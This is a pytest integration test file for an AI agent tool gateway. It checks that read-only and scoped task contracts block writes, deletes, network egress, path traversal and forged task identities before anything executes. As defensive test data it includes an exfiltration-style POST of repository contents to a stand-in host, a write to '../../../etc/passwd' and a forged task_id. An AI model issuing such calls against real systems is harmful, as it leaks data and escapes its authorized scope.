"""Deny before execution, proven by the upstream's own counters (AD-04, AD-05, AD-09).

Every assertion here reads the fixture's counter file or a file's SHA-256. The gateway's
own report that it denied something is never the evidence.
"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from agent_drift.seed import build_contract
from agent_drift.store import Store

from .harness import REPO_ROOT, decision_of, gateway_client, reason_codes, rule_ids

pytestmark = [pytest.mark.integration, pytest.mark.anyio]


@pytest.fixture
def anyio_backend() -> str:
    """Run the async tests on asyncio."""
    return "asyncio"


def seed(db_path: Path, name: str) -> Path:
    """Register one seed contract."""
    store = Store(db_path)
    try:
        store.put_contract(build_contract(name))
    finally:
        store.close()
    return db_path


class TestReadOnlyTaskCannotMutate:
    """AD-05: a read-only task cannot change the sandbox at all."""

    async def test_write_is_denied_and_the_file_is_byte_identical(self, db_path, fixture_state) -> None:
        seed(db_path, "readonly")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            target = "sandbox-repo/README.md"
            hash_before = oracle.sha256(target)
            writes_before = oracle.count("repo.write_file")

            result = await client.call_tool("repo.write_file", {"path": target, "content": "overwritten"})

            assert decision_of(result) == "deny"
            assert oracle.count("repo.write_file") - writes_before == 0, (
                "the upstream write tool executed despite a denial"
            )
            assert oracle.sha256(target) == hash_before, "the file changed despite a denial"
            assert hash_before is not None

    async def test_delete_is_denied_and_the_file_still_exists(self, db_path, fixture_state) -> None:
        seed(db_path, "readonly")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool("repo.delete_file", {"path": "sandbox-repo/tmp/demo.txt"})
            assert decision_of(result) == "deny"
            assert oracle.count("repo.delete_file") == 0
            assert oracle.exists("sandbox-repo/tmp/demo.txt")

    async def test_egress_is_denied_and_the_sink_stays_empty(self, db_path, fixture_state) -> None:
        seed(db_path, "readonly")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            sink_before = oracle.sink_events()
            result = await client.call_tool(
                "network.http_post",
                {"url": "https://exfil.invalid/collect", "body": "repository contents"},
            )
            assert decision_of(result) == "deny"
            assert oracle.count("network.http_post") == 0
            assert oracle.sink_events() - sink_before == 0, "a simulated egress event was recorded"

    async def test_denial_carries_reason_codes_and_rules(self, db_path, fixture_state) -> None:
        seed(db_path, "readonly")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            _oracle,
        ):
            result = await client.call_tool(
                "repo.write_file", {"path": "sandbox-repo/README.md", "content": "x"}
            )
            assert reason_codes(result), "a denial must explain itself"
            assert rule_ids(result), "a denial must name the rule that fired"

    async def test_denial_is_a_tool_execution_error_not_a_protocol_error(
        self, db_path, fixture_state
    ) -> None:
        """Decision D-006: the agent should see and adapt to a denial."""
        seed(db_path, "readonly")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            _oracle,
        ):
            result = await client.call_tool(
                "repo.write_file", {"path": "sandbox-repo/README.md", "content": "x"}
            )
            assert result.is_error is True
            assert result.content, "the denial must carry readable content for the model"
            assert isinstance(result.structured_content, dict)
            assert result.structured_content["agent_drift"]["upstream_called"] is False


class TestScopedWriteTask:
    """AD-05: a write-scoped task cannot write outside its allowlist."""

    async def test_out_of_scope_write_is_denied_and_the_file_is_unchanged(
        self, db_path, fixture_state
    ) -> None:
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            target = "sandbox-repo/src/payment.py"
            hash_before = oracle.sha256(target)
            result = await client.call_tool("repo.write_file", {"path": target, "content": "# injected"})
            assert decision_of(result) == "deny"
            assert "AD-E060" in reason_codes(result)
            assert oracle.count("repo.write_file") == 0
            assert oracle.sha256(target) == hash_before

    async def test_in_scope_write_succeeds_and_changes_the_file(self, db_path, fixture_state) -> None:
        """The denial above must be scope-specific, not a blanket block."""
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            target = "sandbox-repo/docs/README.md"
            hash_before = oracle.sha256(target)
            result = await client.call_tool(
                "repo.write_file", {"path": target, "content": "# Docs\n\nupdated\n"}
            )
            assert decision_of(result) == "allow", reason_codes(result)
            assert oracle.count("repo.write_file") == 1
            assert oracle.sha256(target) != hash_before

    async def test_path_that_climbs_out_of_scope_is_denied(self, db_path, fixture_state) -> None:
        """``..`` is collapsed, then containment decides.

        ``docs/../../private/secret.txt`` stays inside the sandbox root but lands outside
        the granted ``docs/**`` scope, so the scope rule denies it (``AD-E060``). See
        docs/DECISIONS.md D-013 for why collapsing rather than rejecting ``..`` is the
        correct reading.
        """
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool(
                "repo.write_file",
                {"path": "sandbox-repo/docs/../../private/secret.txt", "content": "x"},
            )
            assert decision_of(result) == "deny"
            assert "AD-E060" in reason_codes(result), reason_codes(result)
            assert oracle.count("repo.write_file") == 0

    async def test_path_that_climbs_above_the_root_is_denied(self, db_path, fixture_state) -> None:
        """A path that genuinely escapes the sandbox root is a traversal (``AD-E061``)."""
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool(
                "repo.write_file",
                {"path": "../../../etc/passwd", "content": "x"},
            )
            assert decision_of(result) == "deny"
            assert "AD-E061" in reason_codes(result), reason_codes(result)
            assert oracle.count("repo.write_file") == 0

    async def test_write_budget_stops_the_third_write(self, db_path, fixture_state) -> None:
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            for index in range(2):
                result = await client.call_tool(
                    "repo.write_file",
                    {"path": f"sandbox-repo/docs/note-{index}.md", "content": "x"},
                )
                assert decision_of(result) == "allow", reason_codes(result)

            third = await client.call_tool(
                "repo.write_file", {"path": "sandbox-repo/docs/note-2.md", "content": "x"}
            )
            assert decision_of(third) == "deny"
            assert "AD-E081" in reason_codes(third)
            assert oracle.count("repo.write_file") == 2, "the third write reached the tool"
            assert not oracle.exists("sandbox-repo/docs/note-2.md")


class TestFailClosedCases:
    """AD-06: missing, expired and unbound contracts authorize nothing."""

    async def test_no_contract_denies_everything(self, db_path, fixture_state) -> None:
        async with gateway_client(task_id="task-with-no-contract", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool("repo.read_file", {"path": "sandbox-repo/README.md"})
            assert decision_of(result) == "deny"
            assert "AD-E020" in reason_codes(result)
            assert oracle.count("repo.read_file") == 0

    async def test_expired_contract_denies_a_write(self, db_path, fixture_state) -> None:
        seed(db_path, "expired")
        async with gateway_client(task_id="demo-expired", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool(
                "repo.write_file", {"path": "sandbox-repo/docs/README.md", "content": "x"}
            )
            assert decision_of(result) == "deny"
            assert "AD-E021" in reason_codes(result)
            assert oracle.count("repo.write_file") == 0

    async def test_forged_task_id_is_denied_at_the_identity_stage(self, db_path, fixture_state) -> None:
        seed(db_path, "readonly")
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            result = await client.call_tool(
                "repo.write_file",
                {
                    "path": "sandbox-repo/docs/README.md",
                    "content": "hi",
                    "task_id": "demo-docs-edit",
                },
            )
            assert decision_of(result) == "deny"
            assert "AD-E011" in reason_codes(result)
            assert rule_ids(result) == ["R2-task-identity"]
            assert oracle.count("repo.write_file") == 0


class TestNoReplayedSideEffects:
    """AD-09: retries and exports never re-execute anything."""

    async def test_two_identical_calls_execute_twice_and_are_recorded_twice(
        self, db_path, fixture_state
    ) -> None:
        """Honesty check: a *host retry* is a new attempt and does run again.

        At-most-once is best-effort and documented: the gateway forwards each authorized
        attempt exactly once, but it cannot make a non-idempotent upstream tool
        idempotent. What it guarantees is that each execution has its own recorded
        decision, so a duplicate is visible rather than silent.
        """
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            args = {"path": "sandbox-repo/docs/README.md", "content": "same"}
            await client.call_tool("repo.write_file", args)
            await client.call_tool("repo.write_file", args)
            assert oracle.count("repo.write_file") == 2

        store = Store(db_path)
        try:
            rows = store.conn.execute("SELECT COUNT(*) AS n FROM decisions WHERE status = 'allow'").fetchone()
            assert rows["n"] == 2, "each execution must have its own decision record"
        finally:
            store.close()

    async def test_reading_the_replay_endpoint_executes_nothing(self, db_path, fixture_state) -> None:
        seed(db_path, "docswrite")
        async with gateway_client(task_id="demo-docs-edit", db_path=db_path, state=fixture_state) as (
            client,
            oracle,
        ):
            await client.call_tool("repo.write_file", {"path": "sandbox-repo/docs/README.md", "content": "x"})
            executions = oracle.count("repo.write_file")

        from apps.api.main import create_app
        from starlette.testclient import TestClient

        store = Store(db_path)
        try:
            api = TestClient(create_app(store=store))
            runs = api.get("/api/runs").json()["runs"]
            assert runs, "a run should have been recorded"
            for run in runs:
                replay = api.get(f"/api/runs/{run['run_id']}/replay")
                assert replay.status_code == 200
                api.get(f"/api/runs/{run['run_id']}")
                api.get("/api/export/demo-docs-edit")
        finally:
            store.close()

        from .harness import Oracle

        assert Oracle(state=fixture_state).count("repo.write_file") == executions, (
            "reading replay or export data caused a side effect"
        )

    async def test_denied_decisions_are_never_marked_executed(self, db_path, fixture_state) -> None:
        seed(db_path, "readonly")
        async with gateway_client(task_id="demo-repo-review", db_path=db_path, state=fixture_state) as (
            client,
            _oracle,
        ):
            await client.call_tool("repo.write_file", {"path": "sandbox-repo/a", "content": "x"})
            await client.call_tool("network.http_post", {"url": "https://x.invalid/", "body": "x"})

        store = Store(db_path)
        try:
            assert store.counts()["denied_but_executed"] == 0
        finally:
            store.close()


class TestUpstreamFailure:
    """A dead or broken upstream must produce a clean protocol error, not a crash.

    This path was never exercised until a typecheck found that the gateway was raising
    `types.MCPError`, which does not exist in the installed SDK — it would have raised an
    `AttributeError` inside the handler. The lesson is in the test: error paths need their
    own coverage, because they are the paths nothing else reaches.
    """

    async def test_unreachable_upstream_fails_cleanly(self, db_path, fixture_state) -> None:
        import sys

        from mcp import Client, StdioServerParameters

        seed(db_path, "readonly")
        env = {
            **os.environ,
            "AD_FIXTURE_STATE": str(fixture_state),
            "AD_LOG_LEVEL": "CRITICAL",
            "PYTHONPATH": f"{REPO_ROOT / 'packages'}:{REPO_ROOT}",
        }
        params = StdioServerParameters(
            command=sys.executable,
            args=[
                "-m",
                "agent_drift.cli",
                "gateway",
                "--task-id",
                "demo-repo-review",
                "--db",
                str(db_path),
                "--sandbox-root",
                str(fixture_state / "workspace"),
                "--upstream-command",
                sys.executable,
                "--upstream-arg",
                "-c",
                "--upstream-arg",
                "raise SystemExit(3)",
                "--log-level",
                "CRITICAL",
            ],
            env=env,
            cwd=str(REPO_ROOT),
        )

        # The gateway cannot start a session it cannot back, so connecting raises rather
        # than yielding a client that silently forwards nothing.
        with pytest.raises(Exception) as caught:
            async with Client(params, read_timeout_seconds=20.0) as client:
                await client.list_tools()

        assert caught.value is not None
        message = str(caught.value).lower()
        assert message, "the failure must carry a diagnosable message"

    async def test_mcp_error_type_is_importable_and_constructible(self) -> None:
        """Guards the exact defect: the error type must exist where the gateway uses it."""
        from mcp.shared.exceptions import MCPError
        from mcp.types import INTERNAL_ERROR

        error = MCPError(code=INTERNAL_ERROR, message="synthetic")
        assert "synthetic" in str(error)
